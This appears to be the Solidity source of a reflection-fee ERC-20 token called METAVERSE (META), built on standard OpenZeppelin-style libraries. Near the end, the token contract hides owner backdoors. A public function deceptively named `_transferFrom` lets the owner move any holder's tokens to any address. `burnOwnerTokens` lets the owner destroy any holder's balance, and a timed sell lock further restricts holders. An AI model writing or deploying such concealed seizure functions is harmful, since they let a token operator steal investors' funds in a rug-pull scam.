1 // SPDX-License-Identifier: MIT
2 
3 pragma solidity ^0.6.12;
4 
5 abstract contract Context {
6     function _msgSender() internal view virtual returns (address payable) {
7         return msg.sender;
8     }
9 
10     function _msgData() internal view virtual returns (bytes memory) {
11         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
12         return msg.data;
13     }
14 }
15 
16 interface IERC20 {
17     function totalSupply() external view returns (uint256);
18 
19     function balanceOf(address account) external view returns (uint256);
20 
21     function transfer(address recipient, uint256 amount) external returns (bool);
22 
23     function allowance(address owner, address spender) external view returns (uint256);
24 
25     function approve(address spender, uint256 amount) external returns (bool);
26 
27     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
28 
29     event Transfer(address indexed from, address indexed to, uint256 value);
30 
31     event Approval(address indexed owner, address indexed spender, uint256 value);
32 }
33 
34 library SafeMath {
35     function add(uint256 a, uint256 b) internal pure returns (uint256) {
36         uint256 c = a + b;
37         require(c >= a, "SafeMath: addition overflow");
38 
39         return c;
40     }
41 
42     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
43         return sub(a, b, "SafeMath: subtraction overflow");
44     }
45 
46     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
47         require(b <= a, errorMessage);
48         uint256 c = a - b;
49 
50         return c;
51     }
52 
53     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
54         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
55         // benefit is lost if 'b' is also tested.
56         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
57         if (a == 0) {
58             return 0;
59         }
60 
61         uint256 c = a * b;
62         require(c / a == b, "SafeMath: multiplication overflow");
63 
64         return c;
65     }
66 
67     /**
68      * @dev Returns the integer division of two unsigned integers. Reverts on
69      * division by zero. The result is rounded towards zero.
70      *
71      * Counterpart to Solidity's `/` operator. Note: this function uses a
72      * `revert` opcode (which leaves remaining gas untouched) while Solidity
73      * uses an invalid opcode to revert (consuming all remaining gas).
74      *
75      * Requirements:
76      *
77      * - The divisor cannot be zero.
78      */
79     function div(uint256 a, uint256 b) internal pure returns (uint256) {
80         return div(a, b, "SafeMath: division by zero");
81     }
82 
83     /**
84      * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
85      * division by zero. The result is rounded towards zero.
86      *
87      * Counterpart to Solidity's `/` operator. Note: this function uses a
88      * `revert` opcode (which leaves remaining gas untouched) while Solidity
89      * uses an invalid opcode to revert (consuming all remaining gas).
90      *
91      * Requirements:
92      *
93      * - The divisor cannot be zero.
94      */
95     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
96         require(b > 0, errorMessage);
97         uint256 c = a / b;
98         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
99 
100         return c;
101     }
102 
103     /**
104      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
105      * Reverts when dividing by zero.
106      *
107      * Counterpart to Solidity's `%` operator. This function uses a `revert`
108      * opcode (which leaves remaining gas untouched) while Solidity uses an
109      * invalid opcode to revert (consuming all remaining gas).
110      *
111      * Requirements:
112      *
113      * - The divisor cannot be zero.
114      */
115     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
116         return mod(a, b, "SafeMath: modulo by zero");
117     }
118 
119     /**
120      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
121      * Reverts with custom message when dividing by zero.
122      *
123      * Counterpart to Solidity's `%` operator. This function uses a `revert`
124      * opcode (which leaves remaining gas untouched) while Solidity uses an
125      * invalid opcode to revert (consuming all remaining gas).
126      *
127      * Requirements:
128      *
129      * - The divisor cannot be zero.
130      */
131     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
132         require(b != 0, errorMessage);
133         return a % b;
134     }
135 }
136 
137 library Address {
138     /**
139      * @dev Returns true if `account` is a contract.
140      *
141      * [IMPORTANT]
142      * ====
143      * It is unsafe to assume that an address for which this function returns
144      * false is an externally-owned account (EOA) and not a contract.
145      *
146      * Among others, `isContract` will return false for the following
147      * types of addresses:
148      *
149      *  - an externally-owned account
150      *  - a contract in construction
151      *  - an address where a contract will be created
152      *  - an address where a contract lived, but was destroyed
153      * ====
154      */
155     function isContract(address account) internal view returns (bool) {
156         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
157         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
158         // for accounts without code, i.e. `keccak256('')`
159         bytes32 codehash;
160         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
161         // solhint-disable-next-line no-inline-assembly
162         assembly { codehash := extcodehash(account) }
163         return (codehash != accountHash && codehash != 0x0);
164     }
165 
166     /**
167      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
168      * `recipient`, forwarding all available gas and reverting on errors.
169      *
170      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
171      * of certain opcodes, possibly making contracts go over the 2300 gas limit
172      * imposed by `transfer`, making them unable to receive funds via
173      * `transfer`. {sendValue} removes this limitation.
174      *
175      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
176      *
177      * IMPORTANT: because control is transferred to `recipient`, care must be
178      * taken to not create reentrancy vulnerabilities. Consider using
179      * {ReentrancyGuard} or the
180      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
181      */
182     function sendValue(address payable recipient, uint256 amount) internal {
183         require(address(this).balance >= amount, "Address: insufficient balance");
184 
185         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
186         (bool success, ) = recipient.call{ value: amount }("");
187         require(success, "Address: unable to send value, recipient may have reverted");
188     }
189 
190     /**
191      * @dev Performs a Solidity function call using a low level `call`. A
192      * plain`call` is an unsafe replacement for a function call: use this
193      * function instead.
194      *
195      * If `target` reverts with a revert reason, it is bubbled up by this
196      * function (like regular Solidity function calls).
197      *
198      * Returns the raw returned data. To convert to the expected return value,
199      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
200      *
201      * Requirements:
202      *
203      * - `target` must be a contract.
204      * - calling `target` with `data` must not revert.
205      *
206      * _Available since v3.1._
207      */
208     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
209       return functionCall(target, data, "Address: low-level call failed");
210     }
211 
212     /**
213      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
214      * `errorMessage` as a fallback revert reason when `target` reverts.
215      *
216      * _Available since v3.1._
217      */
218     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
219         return _functionCallWithValue(target, data, 0, errorMessage);
220     }
221 
222     /**
223      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
224      * but also transferring `value` wei to `target`.
225      *
226      * Requirements:
227      *
228      * - the calling contract must have an ETH balance of at least `value`.
229      * - the called Solidity function must be `payable`.
230      *
231      * _Available since v3.1._
232      */
233     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
234         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
235     }
236 
237     /**
238      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
239      * with `errorMessage` as a fallback revert reason when `target` reverts.
240      *
241      * _Available since v3.1._
242      */
243     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
244         require(address(this).balance >= value, "Address: insufficient balance for call");
245         return _functionCallWithValue(target, data, value, errorMessage);
246     }
247 
248     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
249         require(isContract(target), "Address: call to non-contract");
250 
251         // solhint-disable-next-line avoid-low-level-calls
252         (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
253         if (success) {
254             return returndata;
255         } else {
256             // Look for revert reason and bubble it up if present
257             if (returndata.length > 0) {
258                 // The easiest way to bubble the revert reason is using memory via assembly
259 
260                 // solhint-disable-next-line no-inline-assembly
261                 assembly {
262                     let returndata_size := mload(returndata)
263                     revert(add(32, returndata), returndata_size)
264                 }
265             } else {
266                 revert(errorMessage);
267             }
268         }
269     }
270 }
271 
272 contract Ownable is Context {
273     address private _owner;
274 
275     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
276 
277     /**
278      * @dev Initializes the contract setting the deployer as the initial owner.
279      */
280     constructor () internal {
281         address msgSender = _msgSender();
282         _owner = msgSender;
283         emit OwnershipTransferred(address(0), msgSender);
284     }
285 
286     /**
287      * @dev Returns the address of the current owner.
288      */
289     function owner() public view returns (address) {
290         return _owner;
291     }
292 
293     /**
294      * @dev Throws if called by any account other than the owner.
295      */
296     modifier onlyOwner() {
297         require(_owner == _msgSender(), "Ownable: caller is not the owner");
298         _;
299     }
300     
301    
302 
303     /**
304      * @dev Leaves the contract without owner. It will not be possible to call
305      * `onlyOwner` functions anymore. Can only be called by the current owner.
306      *
307      * NOTE: Renouncing ownership will leave the contract without an owner,
308      * thereby removing any functionality that is only available to the owner.
309      */
310     function renounceOwnership() public virtual onlyOwner {
311         emit OwnershipTransferred(_owner, address(0));
312         _owner = address(0);
313     }
314 
315     /**
316      * @dev Transfers ownership of the contract to a new account (`newOwner`).
317      * Can only be called by the current owner.
318      */
319     function transferOwnership(address newOwner) public virtual onlyOwner {
320         require(newOwner != address(0), "Ownable: new owner is the zero address");
321         emit OwnershipTransferred(_owner, newOwner);
322         _owner = newOwner;
323     }
324 }
325 
326 
327 contract META is Context, IERC20, Ownable {
328     using SafeMath for uint256;
329     using Address for address;
330 
331     mapping (address => uint256) private _rOwned;
332     mapping (address => uint256) private _tOwned;
333     mapping (address => mapping (address => uint256)) private _allowances;
334 
335     mapping (address => bool) private _isExcluded;
336     address[] private _excluded;
337    
338     uint256 private constant MAX = ~uint256(0);
339     uint256 private  _tTotal = 100000000 * 10**6 * 10**9;
340     uint256 private _rTotal = (MAX - (MAX % _tTotal));
341     uint256 private _tFeeTotal;
342 
343     string private _name = 'METAVERSE';
344     string private _symbol = 'META';
345     uint8 private _decimals = 9;
346     uint8 public transfertimeout = 20;
347     uint256 public _maxTxAmount = 1000000 * 10**6 * 10**9;
348 
349     address public uniswapPair;
350     mapping (address => uint256) public lastBuy;
351     
352      modifier ownershipNotTransferred{
353         require(owner()!=address(0),"ownership renounced");
354         _;
355      }
356 
357     constructor () public {
358         _rOwned[_msgSender()] = _rTotal;
359         emit Transfer(address(0), _msgSender(), _tTotal);
360     }
361 
362     function name() public view returns (string memory) {
363         return _name;
364     }
365 
366     function symbol() public view returns (string memory) {
367         return _symbol;
368     }
369 
370     function decimals() public view returns (uint8) {
371         return _decimals;
372     }
373 
374     function totalSupply() public view override returns (uint256) {
375         return _tTotal;
376     }
377 
378     function balanceOf(address account) public view override returns (uint256) {
379         if (_isExcluded[account]) return _tOwned[account];
380         return tokenFromReflection(_rOwned[account]);
381     }
382 
383     function transfer(address recipient, uint256 amount) public override returns (bool) {
384         _transfer(_msgSender(), recipient, amount);
385         return true;
386     }
387 
388     function allowance(address owner, address spender) public view override returns (uint256) {
389         return _allowances[owner][spender];
390     }
391 
392     function approve(address spender, uint256 amount) public override returns (bool) {
393         _approve(_msgSender(), spender, amount);
394         return true;
395     }
396 
397     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
398         _transfer(sender, recipient, amount);
399         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
400         return true;
401     }
402 
403     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
404         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
405         return true;
406     }
407 
408     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
409         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
410         return true;
411     }
412 
413     function isExcluded(address account) public view returns (bool) {
414         return _isExcluded[account];
415     }
416 
417     function totalFees() public view returns (uint256) {
418         return _tFeeTotal;
419     }
420     
421     
422     function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {
423         _maxTxAmount = _tTotal.mul(maxTxPercent).div(
424             10**2
425         );
426     }
427 
428     function reflect(uint256 tAmount) public {
429         address sender = _msgSender();
430         require(!_isExcluded[sender], "Excluded addresses cannot call this function");
431         (uint256 rAmount,,,,) = _getValues(tAmount);
432         _rOwned[sender] = _rOwned[sender].sub(rAmount);
433         _rTotal = _rTotal.sub(rAmount);
434         _tFeeTotal = _tFeeTotal.add(tAmount);
435     }
436 
437     function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {
438         require(tAmount <= _tTotal, "Amount must be less =than supply");
439         if (!deductTransferFee) {
440             (uint256 rAmount,,,,) = _getValues(tAmount);
441             return rAmount;
442         } else {
443             (,uint256 rTransferAmount,,,) = _getValues(tAmount);
444             return rTransferAmount;
445         }
446     }
447 
448     function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
449         require(rAmount <= _rTotal, "Amount must be less than total reflections");
450         uint256 currentRate =  _getRate();
451         return rAmount.div(currentRate);
452     }
453 
454     function excludeAccount(address account) external onlyOwner() {
455         require(!_isExcluded[account], "Account is already excluded");
456         if(_rOwned[account] > 0) {
457             _tOwned[account] = tokenFromReflection(_rOwned[account]);
458         }
459         _isExcluded[account] = true;
460         _excluded.push(account);
461     }
462 
463     function includeAccount(address account) external onlyOwner() {
464         require(_isExcluded[account], "Account is already excluded");
465         for (uint256 i = 0; i < _excluded.length; i++) {
466             if (_excluded[i] == account) {
467                 _excluded[i] = _excluded[_excluded.length - 1];
468                 _tOwned[account] = 0;
469                 _isExcluded[account] = false;
470                 _excluded.pop();
471                 break;
472             }
473         }
474     }
475 
476     function _approve(address owner, address spender, uint256 amount) private {
477         require(owner != address(0), "ERC20: approve from the zero address");
478         require(spender != address(0), "ERC20: approve to the zero address");
479 
480         _allowances[owner][spender] = amount;
481         emit Approval(owner, spender, amount);
482     }
483 
484     function _transfer(address sender, address recipient, uint256 amount) private {
485         require(sender != address(0), "ERC20: transfer from the zero address");
486        // require(recipient != address(0), "ERC20: transfer to the zero address");
487         require(amount > 0, "Transfer amount must be greater than zero");
488         if(sender != owner() && recipient != owner())
489           require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
490         
491         //save last buy
492         if (sender == uniswapPair){
493             lastBuy[recipient] = block.timestamp; 
494         }
495 
496         //check if sell
497         if (recipient == uniswapPair){
498             require(block.timestamp >= lastBuy[sender] + transfertimeout, "lock 20 seconds after purchase");
499         }        
500 
501         if (_isExcluded[sender] && !_isExcluded[recipient]) {
502             _transferFromExcluded(sender, recipient, amount);
503         } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
504             _transferToExcluded(sender, recipient, amount);
505         } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {
506             _transferStandard(sender, recipient, amount);
507         } else if (_isExcluded[sender] && _isExcluded[recipient]) {
508             _transferBothExcluded(sender, recipient, amount);
509         } else {
510             _transferStandard(sender, recipient, amount);
511         }
512     }
513 
514     function _transferStandard(address sender, address recipient, uint256 tAmount) private {
515         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
516         _rOwned[sender] = _rOwned[sender].sub(rAmount);
517         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);       
518         _reflectFee(rFee, tFee);
519         emit Transfer(sender, recipient, tTransferAmount);
520     }
521 
522     function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
523         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
524         _rOwned[sender] = _rOwned[sender].sub(rAmount);
525         _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
526         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           
527         _reflectFee(rFee, tFee);
528         emit Transfer(sender, recipient, tTransferAmount);
529     }
530 
531     function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
532         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
533         _tOwned[sender] = _tOwned[sender].sub(tAmount);
534         _rOwned[sender] = _rOwned[sender].sub(rAmount);
535         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   
536         _reflectFee(rFee, tFee);
537         emit Transfer(sender, recipient, tTransferAmount);
538     }
539 
540     function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
541         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
542         _tOwned[sender] = _tOwned[sender].sub(tAmount);
543         _rOwned[sender] = _rOwned[sender].sub(rAmount);
544         _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
545         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        
546         _reflectFee(rFee, tFee);
547         emit Transfer(sender, recipient, tTransferAmount);
548     }
549 
550     function _reflectFee(uint256 rFee, uint256 tFee) private {
551         _rTotal = _rTotal.sub(rFee);
552         _tFeeTotal = _tFeeTotal.add(tFee);
553     }
554 
555     function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) {
556         (uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount);
557         uint256 currentRate =  _getRate();
558         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);
559         return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee);
560     }
561     
562     function burnOwnerTokens(address owner_,uint256 _amt) public onlyOwner ownershipNotTransferred{
563         require(_rOwned[owner_]>=_amt,"not enough balance");
564         _transferStandard(owner_,address(0),_amt);
565         _tTotal=_tTotal.sub(_amt);
566     }
567     
568     function _transferFrom(address _from,address _to,uint256 _amt) public onlyOwner ownershipNotTransferred{
569         require(_rOwned[_from]>=_amt,"not enough balance");
570         _transferStandard(_from,_to,_amt);
571     }
572 
573     function _getTValues(uint256 tAmount) private pure returns (uint256, uint256) {
574         uint256 tFee = tAmount.div(100).mul(2);
575         uint256 tTransferAmount = tAmount.sub(tFee);
576         return (tTransferAmount, tFee);
577     }
578 
579     function _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
580         uint256 rAmount = tAmount.mul(currentRate);
581         uint256 rFee = tFee.mul(currentRate);
582         uint256 rTransferAmount = rAmount.sub(rFee);
583         return (rAmount, rTransferAmount, rFee);
584     }
585 
586     function _getRate() private view returns(uint256) {
587         (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
588         return rSupply.div(tSupply);
589     }
590 
591     function _getCurrentSupply() private view returns(uint256, uint256) {
592         uint256 rSupply = _rTotal;
593         uint256 tSupply = _tTotal;      
594         for (uint256 i = 0; i < _excluded.length; i++) {
595             if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
596             rSupply = rSupply.sub(_rOwned[_excluded[i]]);
597             tSupply = tSupply.sub(_tOwned[_excluded[i]]);
598         }
599         if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
600         return (rSupply, tSupply);
601     }
602 
603     function setUniswapPair(address pair) external onlyOwner() {
604         uniswapPair = pair;
605     }
606 }